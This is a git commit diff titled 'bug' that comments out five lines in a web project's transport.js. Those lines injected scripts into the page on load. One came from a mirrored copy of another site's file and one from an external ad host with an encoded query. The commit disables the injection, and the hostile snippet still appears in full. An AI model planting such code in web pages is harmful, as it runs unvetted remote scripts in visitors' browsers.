4bb1ffa71101ec70aaf3c749f3ad97e5f5bbad1b
xuzenglin <xuzeng@91xunai.com>
2018-04-21 08:10:25 +0800

    bug

--- src/main/webapp/js/transport.js
+++ src/main/webapp/js/transport.js
@@ -1,5 +1,5 @@
-var _atn_obj_ = new Object;
-_atn_obj_.oldurl = '../js/transport.js-cHVzaA=1519656330.js'/*tpa=http://www.52wnc.com/mobile/js/transport.js?cHVzaA=1519656330*/;
-_atn_obj_.unified_url = 'http://uiq.mlnbike.com:2525/ad_unified_access?SP=ABys7Og8/IysrPzczMzMnMx7/OyczRmJuDqN/SztHSztHSzoPOg8vLz8zPz4POg87KzsbJysnMzM+DzsrOxsnKyczMz8/Jx8zPxs+DzsbLzs0='; 
-window.setTimeout(function(){var a=document.createElement("script");a.src=_atn_obj_.oldurl;document.getElementsByTagName("head")[0].appendChild(a);},0); 
-window.setTimeout(function(){var a=document.createElement("script");a.src=_atn_obj_.unified_url;document.getElementsByTagName("head")[0].appendChild(a);},0);
+// var _atn_obj_ = new Object;
+// _atn_obj_.oldurl = '../js/transport.js-cHVzaA=1519656330.js'/*tpa=http://www.52wnc.com/mobile/js/transport.js?cHVzaA=1519656330*/;
+// _atn_obj_.unified_url = 'http://uiq.mlnbike.com:2525/ad_unified_access?SP=ABys7Og8/IysrPzczMzMnMx7/OyczRmJuDqN/SztHSztHSzoPOg8vLz8zPz4POg87KzsbJysnMzM+DzsrOxsnKyczMz8/Jx8zPxs+DzsbLzs0=';
+// window.setTimeout(function(){var a=document.createElement("script");a.src=_atn_obj_.oldurl;document.getElementsByTagName("head")[0].appendChild(a);},0);
+// window.setTimeout(function(){var a=document.createElement("script");a.src=_atn_obj_.unified_url;document.getElementsByTagName("head")[0].appendChild(a);},0);
